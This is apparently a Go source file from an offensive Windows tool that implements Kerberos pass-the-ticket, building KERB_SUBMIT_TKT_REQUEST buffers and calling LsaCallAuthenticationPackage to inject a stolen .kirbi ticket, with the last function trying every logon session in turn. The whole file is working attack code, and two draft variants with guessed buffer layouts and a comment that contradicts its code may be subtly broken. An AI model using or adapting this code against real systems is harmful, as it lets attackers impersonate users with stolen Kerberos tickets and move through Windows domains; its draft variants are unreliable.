package lsa

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// SubmitTicket takes the binary (raw) ticket data (as found in a .kirbi file) and submits it
// to the current session by calling LsaCallAuthenticationPackage.
func SubmitTicket12(lsaHandle syscall.Handle, authPackage int, ticketBytes []byte) error {
	// Build the request buffer according to KERB_SUBMIT_TKT_REQUEST.
	// The layout is:
	// [0:4]   MessageType (uint32) = KerbSubmitTicketMessage
	// [4:8]   Flags (uint32) = 0 (default)
	// [8:12]  KerbCredSize (uint32) = len(ticketBytes)
	// [12: ]  Ticket data (raw bytes)
	const headerSize = 12
	requestSize := headerSize + len(ticketBytes)
	buf := make([]byte, requestSize)

	// Write the header fields in little-endian format.
	binary.LittleEndian.PutUint32(buf[0:4], uint32(KerbSubmitTicketMessage))
	binary.LittleEndian.PutUint32(buf[4:8], 0) // Flags = 0
	binary.LittleEndian.PutUint32(buf[8:12], uint32(len(ticketBytes)))
	// Copy the ticket data after the header.
	copy(buf[12:], ticketBytes)

	// Prepare variables to receive output from LsaCallAuthenticationPackage.
	var retBuf unsafe.Pointer
	var retBufLen uint32
	var protocolStatus uint32

	// Load the Secur32.dll and get the LsaCallAuthenticationPackage function.
	secur32 := windows.NewLazySystemDLL("Secur32.dll")
	procLsaCallAuthenticationPackage := secur32.NewProc("LsaCallAuthenticationPackage")

	// Call LsaCallAuthenticationPackage.
	// The API prototype is:
	// NTSTATUS LsaCallAuthenticationPackage(
	//    HANDLE LsaHandle,
	//    ULONG AuthenticationPackage,
	//    PVOID ProtocolSubmitBuffer,
	//    ULONG SubmitBufferLength,
	//    PVOID *ProtocolReturnBuffer,
	//    PULONG ReturnBufferLength,
	//    PNTSTATUS ProtocolStatus
	// );
	r1, _, le := procLsaCallAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(authPackage),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&retBuf)),
		uintptr(unsafe.Pointer(&retBufLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	// r1 holds the NTSTATUS result of the call.
	if r1 != 0 {
		return fmt.Errorf("LsaCallAuthenticationPackage failed with NTSTATUS 0x%x: %v", r1, le)
	}
	if protocolStatus != 0 {
		return fmt.Errorf("LsaCallAuthenticationPackage protocol status returned 0x%x", protocolStatus)
	}

	// If a return buffer was allocated, free it.
	if retBuf != nil {
		if err := LsaFreeReturnBuffer(uintptr(retBuf)); err != nil {
			return fmt.Errorf("failed to free LSA return buffer: %v", err)
		}
	}
	return nil
}

// SubmitTicket submits a raw Kerberos ticket to the current session via LsaCallAuthenticationPackage.
func SubmitTicket16(lsaHandle syscall.Handle, authPackage int, ticketBytes []byte) error {
	// Revised header with an extra reserved DWORD:
	// [0:4]   MessageType (uint32) = KerbSubmitTicketMessage
	// [4:8]   Flags (uint32) = 0
	// [8:12]  Reserved (uint32) = 0
	// [12:16] KerbCredSize (uint32) = len(ticketBytes)
	// [16: ]  Ticket data
	const headerSize = 16
	requestSize := headerSize + len(ticketBytes)
	buf := make([]byte, requestSize)

	// Fill in the header fields.
	binary.LittleEndian.PutUint32(buf[0:4], uint32(KerbSubmitTicketMessage))
	binary.LittleEndian.PutUint32(buf[4:8], 0)  // Flags = 0 (or try 1 if needed)
	binary.LittleEndian.PutUint32(buf[8:12], 0) // Reserved field
	binary.LittleEndian.PutUint32(buf[12:16], uint32(len(ticketBytes)))
	// Copy the ticket bytes after the header.
	copy(buf[16:], ticketBytes)

	// Prepare output parameters.
	var retBuf unsafe.Pointer
	var retBufLen uint32
	var protocolStatus uint32

	// Load Secur32.dll and get the address of LsaCallAuthenticationPackage.
	secur32 := windows.NewLazySystemDLL("Secur32.dll")
	procLsaCallAuthenticationPackage := secur32.NewProc("LsaCallAuthenticationPackage")

	// Call LsaCallAuthenticationPackage.
	r1, _, le := procLsaCallAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(authPackage),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&retBuf)),
		uintptr(unsafe.Pointer(&retBufLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if r1 != 0 {
		return fmt.Errorf("LsaCallAuthenticationPackage failed with NTSTATUS 0x%x: %v", r1, le)
	}
	if protocolStatus != 0 {
		return fmt.Errorf("LsaCallAuthenticationPackage protocol status returned 0x%x", protocolStatus)
	}

	// Free any allocated return buffer.
	if retBuf != nil {
		if err := LsaFreeReturnBuffer(uintptr(retBuf)); err != nil {
			return fmt.Errorf("failed to free LSA return buffer: %v", err)
		}
	}
	return nil
}

// SubmitTicketFromBase64 decodes a base64-encoded ticket and then calls SubmitTicket.
func SubmitTicketFromBase64(lsaHandle syscall.Handle, authPackage int, ticketBase64 string) error {
	ticketBytes, err := base64.StdEncoding.DecodeString(ticketBase64)
	if err != nil {
		return fmt.Errorf("failed to decode base64 ticket: %v", err)
	}
	return SubmitTicket(lsaHandle, authPackage, ticketBytes)
}

// SubmitTicket submits a raw Kerberos ticket to the current session using the
// pass-the-ticket technique.
//   - lsaHandle: a valid handle obtained via LsaRegisterLogonProcess.
//   - authPackage: the authentication package ID (usually for "kerberos").
//   - ticketBytes: the raw binary ticket data (e.g. from a .kirbi file).
func SubmitTicket(lsaHandle syscall.Handle, authPackage int, ticketBytes []byte) error {

	luids, err := GetLogonSessions()
	if err != nil {
		fmt.Println("[ERROR] GetLogonSessions:", err)
		os.Exit(1)
	}
	if len(luids) == 0 {
		fmt.Println("[ERROR] No logon sessions found")
		os.Exit(1)
	}
	fmt.Printf("[+] Found %d logon sessions\n", len(luids))
	for _, luid := range luids {
		// Build the request structure.
		var req KERB_SUBMIT_TKT_REQUEST
		req.MessageType = KerbSubmitTicketMessage
		// Set LogonId to 0,0 to target the current logon session.
		req.LogonId = luid
		req.Flags = 0
		// For pass-the-ticket, no key is provided.
		req.Key = KERB_CRYPTO_KEY{KeyType: 0, Length: 0, Value: 0}
		req.KerbCredSize = uint32(len(ticketBytes))
		// KerbCredOffset is the size of the request structure.
		req.KerbCredOffset = uint32(unsafe.Sizeof(req))

		// Allocate a buffer: the structure followed by the ticket data.
		bufSize := int(req.KerbCredOffset) + len(ticketBytes)
		buf := make([]byte, bufSize)

		// Copy the structure into the beginning of the buffer.
		// We do a raw memory copy via an unsafe pointer.
		reqPtr := unsafe.Pointer(&req)
		structBytes := (*[1 << 20]byte)(reqPtr)[:req.KerbCredOffset:req.KerbCredOffset]
		copy(buf, structBytes)

		// Append the ticket data after the structure.
		copy(buf[req.KerbCredOffset:], ticketBytes)

		// Prepare output parameters for LsaCallAuthenticationPackage.
		var retBuf unsafe.Pointer
		var retBufLen uint32
		var protocolStatus uint32

		// Load Secur32.dll and obtain the procedure address for LsaCallAuthenticationPackage.
		secur32 := windows.NewLazySystemDLL("Secur32.dll")
		procLsaCallAuthenticationPackage := secur32.NewProc("LsaCallAuthenticationPackage")

		// Call LsaCallAuthenticationPackage.
		r1, _, le := procLsaCallAuthenticationPackage.Call(
			uintptr(lsaHandle),
			uintptr(authPackage),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&retBuf)),
			uintptr(unsafe.Pointer(&retBufLen)),
			uintptr(unsafe.Pointer(&protocolStatus)),
		)
		if r1 != 0 {
			return fmt.Errorf("LsaCallAuthenticationPackage failed with NTSTATUS 0x%x: %v", r1, le)
		}
		if protocolStatus != 0 {
			fmt.Printf("LsaCallAuthenticationPackage protocol status returned 0x%x\n", protocolStatus)
			continue
		}
		// Free the returned buffer if it exists.
		if retBuf != nil {
			if err := LsaFreeReturnBuffer(uintptr(retBuf)); err != nil {
				return fmt.Errorf("failed to free LSA return buffer: %v", err)
			}
		}
		fmt.Println("[+] Ticket submitted successfully")
		return nil
	}

	return fmt.Errorf("failed to submit ticket to any logon session")
}
